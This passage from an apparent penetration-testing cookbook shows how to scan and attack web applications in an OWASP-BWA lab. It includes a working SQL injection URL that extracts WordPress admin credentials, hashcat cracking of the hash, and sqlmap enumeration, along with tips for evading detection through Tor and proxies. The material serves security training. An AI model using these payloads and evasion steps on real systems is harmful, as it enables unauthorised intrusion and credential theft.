<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Web and Database Specific Recipes</h1>
                </header>
            
            <article>
                
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li>Creating an offline copy <span>of a web application</span></li>
<li>Scanning for vulnerabilities</li>
<li>Launching website attacks</li>
<li>Scanning WordPress</li>
<li>Hacking WordPress</li>
<li>Performing SQL injection attacks</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Introduction</h1>
                </header>
            
            <article>
                
<p>Evaluating the security of web applications and databases requires a unique set of tools that can be leveraged against them. Websites and databases are highly targeted environments due to the amount of visibility they have and the information they contain. These could be for publicly accessible sites or intranets. In the event that a web application is compromised, it is highly likely that it may then be used as a jumping off point for further network penetration.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Creating an offline copy of a web application</h1>
                </header>
            
            <article>
                
<p><span>One of the first things that you should do is create an offline copy of the target site. This will allow you to analyze the contents of information such as how forms are submitted, the directory structure of the application, and where files are located. Aside from the technical details of the site's structure, comments, and inactive code can also give you an insight into additional areas of interest. This information can be used to craft site-specific attacks in subsequent portions of this chapter. By creating an offline copy of the site in question, you also limit the number of times that you are touching the site, minimizing the number of records generated in logs, and so on.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>In order to perform an offline copy of a target site, we will need the following:</p>
<ul>
<li>Network access to the target system</li>
<li>BurpSuite free edition (installed by default on Kali Linux)</li>
<li>OWASP-BWA installed as required in <span>the recipe, </span>Installing OWASP-BWA in <a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em> </li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To create an offline copy of the analysis, we will use the following recipe:</p>
<ol>
<li>Launch BurpSuite from the <span class="packt_screen">Applications</span> | <span class="packt_screen">03 - Web Application Analysis</span> menu:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="315" width="342" class="image-border" src="assets/47a520c9-132a-45a6-a054-a7605ba8c047.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Launching BurpSuite</div>
<ol start="2">
<li>If this is the first time it is being launched, you will be presented with a license agreement – please read this before clicking <span class="packt_screen">I Accept</span> to continue.</li>
<li>Since we are using the free version, we will only be able to use the <span class="packt_screen">Temporary Project</span> option, so click on <span class="packt_screen">Next</span>.</li>
<li class="mce-root"><span>For the purposes of this demonstration, we will use the BurpSuite defaults. Click on</span> <span class="packt_screen">Start Burp</span> <span>to continue.</span></li>
</ol>
<div class="packt_infobox">The default values for BurpSuite should be changed to something more appropriate if you are going to use this platform for connections other than your testing server, as these values are known, and are likely to trigger intrusion detection systems.</div>
<ol start="5">
<li>Once BurpSuite starts, you will see a number of tabs:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img class="image-border" src="assets/777c7879-940d-4cb7-85d2-7263864e7582.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign"> Initial view of BurpSuite</div>
<ol start="6">
<li>Select the main tab <span class="packt_screen">Proxy</span>, and be sure that <span class="packt_screen">intercept is off</span> is displayed as follows. If it is enabled, clicking on that link will toggle the status to <span class="packt_screen">off</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="143" width="336" class="image-border" src="assets/8c5ddabe-bb09-41a3-aaea-72525b02c1db.png"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Disable Intercept</div>
<ol start="7">
<li>Your browser should next be configured to use BurpSuite as its proxy. To do this, open Firefox ESR, and navigate to the <span class="packt_screen">Preferences</span> | <span class="packt_screen">Advance</span><span class="packt_screen">d</span> | <span class="packt_screen">Network</span> | <span class="packt_screen">Connections</span> | <span class="packt_screen">Settings</span> menu. You will configure your proxy settings as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="404" width="339" class="image-border" src="assets/c098138c-12fe-42bc-9fdd-a729b7c64ca0.png"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Browser proxy configuration</div>
<ol start="8">
<li>Once <span class="packt_screen">Proxy</span> settings are complete, use Firefox to navigate to the IP address of your OWASP-BWA instance. From here, navigate through some of the application options to familiarize yourself with the layout.</li>
</ol>
<div class="packt_infobox">Since BurpSuite is running as your browser's proxy, you may see SSL certificate errors – this is to be expected.</div>
<ol start="9">
<li>Return back to your BurpSuite app, and review the entries in the <span class="packt_screen">Proxy</span> | <span class="packt_screen">HTTP history</span> tab. Locate the initial request to your OWASP-BWA instance, and highlight it. Right-click on this entry, and select <span class="packt_screen">Add to scope</span>:</li>
</ol>
<div style="color: black;font-size: 1em" class="CDPAlignCenter CDPAlign"><img height="287" width="508" class="image-border" src="assets/daa647a0-b4f7-404d-8b35-d4c2730264ec.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Adding OWASP-BWA to target scope</div>
<div class="packt_infobox">You will see different numbers in the first column, as this is generated sequentially. Sort on the URL column to locate the <kbd>/</kbd> request. Once specified as being in scope, BurpSuite will only record the proxy history for this host.</div>
<ol start="10">
<li>To review the scope configuration, navigate to <span class="packt_screen">Target</span> | <span class="packt_screen">Scope</span>, select the host entry for your OWASP-BWA instance, and select <span class="packt_screen">Edit</span>. You can see there are several different options that you can select here, including the use of regular expressions to help make target selection easier. Since our example is a single host, we will not change this option and will leave the target port as <kbd>80</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="463" width="529" class="image-border" src="assets/2b812eee-2985-4ac2-984c-1c35cba1d8bc.png"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">OWASP scope configuration</div>
<ol start="11">
<li>The generation of the offline copy requires certain information prior to use. Navigate to <span class="packt_screen">Spider</span> | <span class="packt_screen">Options</span>, and review the available options. We will leave them as the default for now:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="543" width="673" class="image-border" src="assets/f37f1aab-b569-4044-bd41-06a5b759e44b.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">BurpSuite spider options</div>
<ol start="12">
<li>You can check on the progress of the analysis by visiting <span class="packt_screen">Spider</span> | <span class="packt_screen">Control</span>, where you will see the current status:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="362" width="439" class="image-border" src="assets/ca98bd88-a68c-49bf-a194-e1a768ad1006.png"/></div>
<ol start="13">
<li>Once the spider starts collecting data, it can be found in the <span class="packt_screen">Target</span> | <span class="packt_screen">Site map</span> section of BurpSuite. Here you can see all requests made through the proxy, with the hosts within the target scope in bold:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="531" width="706" class="image-border" src="assets/5389f583-f63c-4888-8627-b54234654ab9.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Site map details of target web application</div>
<ol start="14">
<li>You can now review the contents of, not only the application documents themselves, but also all requests sent to and received from the server. By reviewing this, as well as the site map information, you can begin identifying additional areas of inspection.</li>
</ol>
<div class="packt_infobox">You will notice traffic identified by BurpSuite that is not part of the target scope in the site map. This is due to the fact that all traffic being generated by the browser is being proxied, and therefore added to the site map. The non-target hosts are listed but are greyed out – if you want to add additional hosts to the scope, right-click on the host in question, and select <span class="packt_screen">Add to scope</span>. Once added, the spider will include this host in the analysis.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The information gathered by BurpSuite spider is extensive and a detailed analysis of all data gathered would require a book by itself. For more information on how to leverage this data to a greater level of detail, refer to the PortSwigger site at <a href="https://support.portswigger.net/">https://support.portswigger.net/</a>.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Scanning for vulnerabilities</h1>
                </header>
            
            <article>
                
<p>Web applications pose a particular risk to organizations as they are accessible to the internet, and therefore can be accessed by anyone. If you consider this carefully, untrusted external entities are being permitted access to applications and systems within the organization's security perimeter, making them an excellent jumping off point for further infiltration, once compromised.</p>
<p>We will now move to the next phase of our approach, using OWASP-ZAP, we will scan the target system for vulnerabilities that can potentially be exploited.</p>
<div class="packt_tip">One of the key reasons we perform on an offline copy of a target system is to better craft your tool's configuration to minimize the noise generated by the scanning process. With the exceptional focus on security in the industry as a result of high-profile breaches, many corporations are implementing intrusion detection/prevention measures that would look for the signatures of attacks against their systems. These systems, if triggered, can prevent you from any access whatsoever. Use with caution.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To successfully complete this section, we will need the following:</p>
<ul>
<li>Installation and configuration of OWASP-BWA as highlighted <span>in the recipe, </span><em>Installing OWASP-BWA</em> in <a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em> </li>
<li>Network connectivity between your Kali Linux desktop and the OWASP-BWA instance</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To execute a vulnerability scan of a target system using OWASP-ZAP, we will perform the following tasks:</p>
<ol class="1">
<li>From the Kali Linux Applications menu, navigate to <span class="packt_screen">Applications</span> | <span class="packt_screen">03</span> <span class="packt_screen">- Web Application Analysis</span> | <span class="packt_screen">owasp-zip</span> to launch the application.</li>
</ol>
<ol start="2">
<li>Once prompted for the type of session persistence, select persistence based on the current timestamp:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="173" width="380" class="image-border" src="assets/7e0df357-9b93-48ef-90b5-005ed399763c.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Selecting session persistence</div>
<ol start="3">
<li>In the upper left, change the scan type from <span class="packt_screen">Safe Mode</span> to <span class="packt_screen">ATTACK Mode</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="70" width="290" class="image-border" src="assets/3ad1e25b-de6c-4a98-b7d9-c9f489d33341.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Changing OWASP-ZAP script mode</div>
<ol start="4">
<li>Once you have done this, we will enter the IP address of the OWASP-BWA device into the input field in the <span class="packt_screen">Quick Start</span> tab and click <span class="packt_screen">Attack</span>. This will start the scanning process:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="258" width="673" class="image-border" src="assets/e3939d7e-fd3c-40a2-a695-d17231dd965b.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initiating OWASP-ZAP scan</div>
<ol start="5">
<li>To monitor the progress of a scan, under the <span class="packt_screen">Active Scan</span> tab, click on the icon to the immediate left of the progress bar:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="72" width="301" class="image-border" src="assets/59f9d549-6fc3-4684-bf06-5a35602a4ec6.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign"> Launching progress monitor</div>
<ol start="6">
<li>The details of the progression of the scan, as well as the components completed, can be seen in the pop-up window. This can be left open and on a separate area of your desktop to monitor progress, as this may take some time to complete:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="315" width="456" class="image-border" src="assets/f28fdddc-81bf-4bc0-ace1-be3f0689f817.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Detailed progress</div>
<ol start="7">
<li>As the scan progresses, you will see the following panes:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img class="image-border" src="assets/b6cee1a9-6e68-4d25-962f-5eeb40b417e8.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Scan in progress - OWASP-ZAP</div>
<div class="packt_infobox">Some additional information on the panes seen in the preceding image:<br/>
Upper Left: Site map created during the scan of the target site<br/>
Upper Right: The <span class="packt_screen">Request</span> and <span class="packt_screen">Response</span> tabs show communications between the scanner and web server<br/>
Lower Left: Open the <span class="packt_screen">Alerts</span> tab, and you can see the vulnerabilities that are being discovered<br/>
Lower Right: Details of the <span class="packt_screen">Alerts</span> selected from the lower left pane</div>
<ol start="8">
<li>In order to save the results as a detailed report, that we can reference at a later time from the <span class="packt_screen">Report</span> menu, select <span class="packt_screen">Generate HTML Report</span>, and save it to <kbd>/root/Chapter9/owasp-zap.html</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="134" width="354" class="image-border" src="assets/0883b4d9-46e1-47b0-8188-09cb097dbc03.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Saving OWASP-ZAP scan results</div>
<ol start="9">
<li>Once saved, open it in Firefox and review the results. We will be using the information contained in this report in subsequent recipes:</li>
</ol>
<div style="padding-left: 30px" class="CDPAlignCenter CDPAlign"><img height="390" width="491" class="image-border" src="assets/14e77849-92aa-4178-a91a-5129e48135b4.png"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>Since traffic to and from internet sites is easily traced, you may consider running your scans through alternate connection paths. Some examples of this are:</p>
<ul>
<li>Tor network, using the proxy chains package</li>
<li><strong>Virtual Private Network</strong> (<strong>VPN</strong>)
<ul>
<li>SSH tunneling</li>
<li>3rd party VPN services</li>
</ul>
</li>
<li>Anonymizing proxies</li>
</ul>
<p>Each of these come with their own benefits and risks, so consider the best balance of performance, ease of use, and accuracy of results when considering one of these options.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Launching website attacks</h1>
                </header>
            
            <article>
                
<p>As mentioned in the previous sections, web servers represent a network device that resides on both the internal and external networks and can be used as a pathway to internal segments if successfully compromised. In addition to being a jumping off point to the internal network, web applications frequently handle sensitive data such as customer data, payment information, or medical records – all of which are valuable.</p>
<p>Focusing on the web applications themselves, we will use Vega to perform a deeper analysis on the install applications to identify possible opportunities.</p>
<div class="packt_infobox">We will be focusing on the web applications specifically since we cover platform and daemon vulnerabilities in <a href="efecc8fd-4746-4428-9662-854d418bcba2.xhtml" target="_blank">Chapter 3</a>, <em>Vulnerability Analysis</em> and <a href="9f678d15-2115-4e29-a75d-03dba65d3398.xhtml" target="_blank">Chapter 4</a>, <em>Finding Exploits in the Target.</em></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To successfully complete this section, we will need the following:</p>
<ul>
<li>Installation and configuration of OWASP-BWA as highlighted in the recipe <em>Installing OWASP-BWA</em> in <a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em></li>
<li>Network connectivity between your Kali Linux desktop and the OWASP-BWA instance</li>
<li class="mce-root"><span>Installation of Vega from the command line as follows:</span></li>
</ul>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9#apt-get install vega</strong></pre>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will do the following:</p>
<ol>
<li>From the command line, launch Vega, and add our OWASP-BWA instance as a new scan. When presented with the options dialog box, select all available checks, and start the scan.</li>
<li>As the scan progresses, we will see more alerts generated in the Vega interface:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="389" width="652" class="image-border" src="assets/4765e9f1-09c9-418e-bba3-d730c63a9554.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Vega scan overview</div>
<ol start="3">
<li>Selecting an alert in the left column will give you more details on the right, in this case, a remote shell injection vulnerability:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="394" width="668" class="image-border" src="assets/3271bff4-12d5-4b99-a19d-f819bc6eb8a7.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Remote shell injection vulnerability</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Scanning WordPress</h1>
                </header>
            
            <article>
                
<p>WordPress is one of the most popular <strong>content management systems</strong> (<strong>CMS</strong>) used on the internet and due to its popularity and the ability for programmers to create custom components that integrate with WordPress, it presents a potentially attractive target. </p>
<p>Because of this popularity, there are many tools designed to scan for these vulnerabilities. We will be using one of these tools, WPScan.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To successfully complete this section, we will need the following:</p>
<ul>
<li>Installation and configuration of OWASP-BWA as highlighted in the recipe <em>Installing OWASP-BWA</em> in <a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em></li>
<li>Network connectivity between your Kali Linux desktop and the OWASP-BWA instance</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>The following steps are needed in order to perform a scan against a WordPress site using WPScan:</p>
<ol>
<li>From the command line, we will run the following to make sure that we have the latest database downloaded and installed:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# wpscan --update</strong></pre>
<ol start="2">
<li>Once complete and updated, we now can use WPScan to start evaluating the security of our target WordPress site (located on our OWASP-BWA image):</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# wpscan --url http://192.168.56.100/wordpress/ --enumerate vp,vt --log wpscan.log</strong></pre>
<ol start="3">
<li>The preceding command runs WPScan against our WordPress instance on our OWASP-BWA host and looks for known <strong>vulnerable plugins</strong> (<strong>vp</strong>) and known <strong>vulnerable themes</strong> (<strong>vt</strong>), and saves the information to <kbd>wpscan.log</kbd>.</li>
</ol>
<div class="packt_tip">When scanning a remote WordPress host, it is good practice to run through different user agents to observe if the target system returns different results based on this change. You can instruct WPScan to use random user agents by including the <kbd>-r</kbd> switch in the command line.</div>
<ol start="4">
<li>The resulting log file can now be reviewed to see what vulnerabilities are present on the target. We can get a quick list of the vulnerabilities by running the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# cat wpscan.log | grep Title:</strong><br/><strong>[!] Title: Wordpress 1.5.1 - 2.0.2 wp-register.php Multiple Parameter XSS</strong><br/><strong>[!] Title: WordPress 2.0 - 2.7.1 admin.php Module Configuration Security Bypass</strong><br/><strong>[!] Title: WordPress 1.5.1 - 3.5 XMLRPC Pingback API Internal/External Port Scanning</strong><br/><strong>[!] Title: WordPress 1.5.1 - 3.5 XMLRPC pingback additional issues</strong><br/><strong>[!] Title: WordPress 2.0 - 3.0.1 wp-includes/comment.php Bypass Spam Restrictions</strong><br/><strong>[!] Title: WordPress 2.0 - 3.0.1 Multiple Cross-Site Scripting (XSS) in request_filesystem_credentials()</strong><br/><strong>[!] Title: WordPress 2.0 - 3.0.1 Cross-Site Scripting (XSS) in wp-admin/plugins.php</strong><br/><strong>[!] Title: WordPress 2.0 - 3.0.1 wp-includes/capabilities.php Remote Authenticated Administrator Delete Action Bypass</strong><br/><strong>[!] Title: WordPress 2.0 - 3.0 Remote Authenticated Administrator Add Action Bypass</strong><br/><strong>[!] Title: WordPress &lt;= 4.0 - Long Password Denial of Service (DoS)</strong><br/><strong>[!] Title: WordPress &lt;= 4.0 - Server Side Request Forgery (SSRF)</strong><br/><strong>[!] Title: WordPress &lt;= 4.7 - Post via Email Checks mail.example.com by Default</strong><br/><strong>[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)</strong><br/><strong>[!] Title: myGallery &lt;= 1.4b4 - Remote File Inclusion</strong><br/><strong>[!] Title: Spreadsheet &lt;= 0.6 - SQL Injection</strong></pre>
<ol start="5">
<li>To get more details on the vulnerabilities located in this report, view the full log file, as it contains URLs to online resources with more detailed information. For example, our installation is vulnerable to the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>[!] Title: Spreadsheet &lt;= 0.6 - SQL Injection</strong><br/><strong>    Reference: https://wpvulndb.com/vulnerabilities/6482</strong><br/><strong>    Reference: https://www.exploit-db.com/exploits/5486/</strong></pre>
<ol start="6">
<li>The information in this scan will be used in the next section, where we will use these vulnerabilities to take control of our WordPress installation.</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Hacking WordPress</h1>
                </header>
            
            <article>
                
<p>With information on WordPress vulnerabilities available, and with the increase of useful tools to validate the security of WordPress installations, we will now use that information to perform an attack on a WordPress installation targeting the administrative user through an identified SQL injection vulnerability in a third party plugin.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To successfully complete this section, we will need the following:</p>
<ul>
<li>Installation and configuration of OWASP-BWA as highlighted in the recipe <em>Installing OWASP-BWA</em> of <a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em> </li>
<li>Network connectivity between your Kali Linux desktop and the OWASP-BWA instance</li>
<li>Results from the WPScan run in the section <em>Scanning WordPress</em></li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To gain access to the remote WordPress installation, we will do the following:</p>
<ol>
<li>Based on the previous use of WPScan, we see that there is a SQL injection vulnerability in the Spreadsheet plugin. Unfortunately, in our WPScan, we were unable to enumerate users, so we will use this vulnerability to get the admin user information for this installation.</li>
<li>From a command line, we will use the <kbd>searchsploit</kbd> tool to locate ways to exploit this vulnerability:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# searchsploit WordPress Plugin Spreadsheet 0.6 - SQL Injection</strong></pre>
<ol start="3">
<li>This will present us with information, indicating that exploit information is available in the file <kbd>/usr/share/exploitdb/platforms/php/webapps/5486.txt</kbd>. When we open this file, it contains an example URL that will allow us to pull the admin info:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# more /usr/share/exploitdb/platforms/php/webapps/5486.txt</strong><br/><strong>===========================================</strong><br/><strong>There's standart sql-injection in Spreadsheet &lt;= 0.6 Plugin</strong><br/><strong># Author : 1ten0.0net1</strong><br/><strong># Script : Wordpress Plugin Spreadsheet &lt;= 0.6 v.</strong><br/><strong># Download : http://timrohrer.com/blog/?page_id=71</strong><br/><strong># BUG :  Remote SQL-Injection Vulnerability</strong><br/><strong># Dork : inurl:/wp-content/plugins/wpSS/</strong><br/><strong>Example:</strong><br/><strong>http://site.com/wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&amp;display=plain</strong><br/><strong>===========================================</strong><br/><strong>Vulnerable code:</strong><br/><strong>ss_load.php</strong><br/><strong>    $id = $_GET['ss_id'];</strong><br/><strong>....</strong><br/><strong>ss_functions.php:</strong><br/><strong>function ss_load ($id, $plain=FALSE) {</strong><br/><strong>....</strong><br/><strong>    if ($wpdb-&gt;query("SELECT * FROM $table_name WHERE id='$id'") == 0) {</strong><br/><strong>....</strong><br/><strong>==&gt; Visit us @ forum.antichat.ru</strong><br/><strong># milw0rm.com [2008-04-22]</strong></pre>
<ol start="4">
<li>If we take the example URL from the preceding example and adapt it to our directory structure, we get the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>http://192.168.56.100/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&amp;display=plain</strong></pre>
<ol start="5">
<li>Taking the preceding URL, we enter that into our Firefox browser and access the page. Due to the SQL injection, we are presented with the user (admin), hashed password, and email address for the user with the ID of <kbd>1</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="76" width="412" class="image-border" src="assets/5a2f1100-b9d2-405f-9727-a5a587d88750.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Admin user information obtained through vulnerable plugin</div>
<ol start="6">
<li>Let's add that to a file so that we can run it through hashcat to get the password:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# echo 21232f297a57a5a743894a0e4a801fc3 &gt; wp_admin.txt</strong></pre>
<ol start="7">
<li>It is important to note that in WordPress versions 2.4 and prior, the password was hashed as an unsalted MD5 hash, so we will need to tell hashcat that the format is MD5 (<kbd>-m 0</kbd>), to use the hash we saved into <kbd>wp_admin.txt</kbd>, and to use the local copy of <kbd>rockyou.txt</kbd> dictionary:</li>
</ol>
<pre style="padding-left: 60px"><strong>hashcat -m 0 wp_admin.txt ./rockyou.txt</strong></pre>
<ol start="8">
<li>Hashcat will now run through <kbd>rockyou.txt</kbd> and display the following, including the password for the admin account (in this case, it is <kbd>admin</kbd>):</li>
</ol>
<pre style="padding-left: 60px"><strong>Session..........: hashcat</strong><br/><strong>Status...........: Cracked</strong><br/><strong>Hash.Type........: MD5</strong><br/><strong>Hash.Target......: 21232f297a57a5a743894a0e4a801fc3</strong><br/><strong>Time.Started.....: Thu Aug 31 22:25:21 2017 (0 secs)</strong><br/><strong>Time.Estimated...: Thu Aug 31 22:25:21 2017 (0 secs)</strong><br/><strong>Guess.Base.......: File (./rockyou.txt)</strong><br/><strong>Guess.Queue......: 1/1 (100.00%)</strong><br/><strong>Speed.Dev.#1.....: 3059.9 kH/s (0.24ms)</strong><br/><strong>Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</strong><br/><strong>Progress.........: 20480/14343297 (0.14%)</strong><br/><strong>Rejected.........: 0/20480 (0.00%)</strong><br/><strong>Restore.Point....: 19456/14343297 (0.14%)</strong><br/><strong>Candidates.#1....: admin -&gt; admin</strong><br/><strong>HWMon.Dev.#1.....: N/A</strong></pre>
<ol start="9">
<li>With the admin user account password, we can now do as we please after logging into the WordPress instance, including add/remove accounts, adding/removing plugins, uploading files of our choice, and so on.</li>
</ol>
<div class="packt_tip">In this case, we were able to get the admin user's hashed password through a SQL injection, which is preferable to brute force, as doing so can lock accounts and alert the target system owners. WPScan has provisions to do remote brute force attacks and will attempt to locate plugins designed to prevent brute force attacks.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Performing SQL injection attacks</h1>
                </header>
            
            <article>
                
<p>Nearly all model web applications use an underlying database for storage of everything from application configuration, localization, user authentication credentials, sales records, patient records, and more. The information is read from and written to by the web applications that face the internet.</p>
<p>Unfortunately, web applications often are written in a way that allows remote users to insert their own commands into input forms, giving them the ability to change how the application behaves, and potentially giving access directly to the database itself.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To successfully complete this section, you will need the following:</p>
<ul>
<li>Installation and configuration of OWASP-BWA as highlighted in the recipe <em>Installing OWASP-BWA</em> in<em> </em><a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em></li>
<li>Network connectivity between your Kali Linux desktop and the OWASP-BWA instance</li>
<li>Scan results from OWASP-ZAP in the recipe, <em>Scanning for Vulnerabilities</em> of<em> </em><a href="f8114976-00fa-415d-94e7-254206a44dbb.xhtml" target="_blank">Chapter 9</a>, <em>Web and Database Specific Recipes</em></li>
<li>You will need to log into the OrangeHRM application at <kbd>http://192.168.56.100/orangehrm/</kbd> with the user/password <kbd>admin</kbd>, and enter some user information, as the database that ships with OWASP does not include this information</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>Starting with the results from the OWASP-ZAP scan from <em>Scanning for vulnerabilities</em>, we will do the following:</p>
<ol>
<li>As seen in <em>Hacking WordPress</em>, a SQL-injection attack allowed us to extract the admin user information that was later cracked with hashcat. We will be taking that single vulnerability and using it to go beyond just the WordPress database.</li>
<li>To start, we need to identify the underlying database. Open a terminal, and at the command line enter the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# sqlmap -u "http://192.168.56.100/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1"</strong></pre>
<ol start="3">
<li>This will provide the following information, indicating it is MySQL server 5 or higher:</li>
</ol>
<pre style="padding-left: 60px"><strong>[03:00:56] [INFO] the back-end DBMS is MySQL</strong><br/><strong>web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)</strong><br/><strong>web application technology: PHP 5.3.2, Apache 2.2.14</strong><br/><strong>back-end DBMS: MySQL &gt;= 5.0</strong></pre>
<ol start="4">
<li>Next, we need to see what other databases are on the target system. From the command line, run the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# sqlmap -u "http://192.168.56.100/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1" --dbs</strong></pre>
<ol start="5">
<li>This will dump a list of all databases accessible through this SQL injection vector:</li>
</ol>
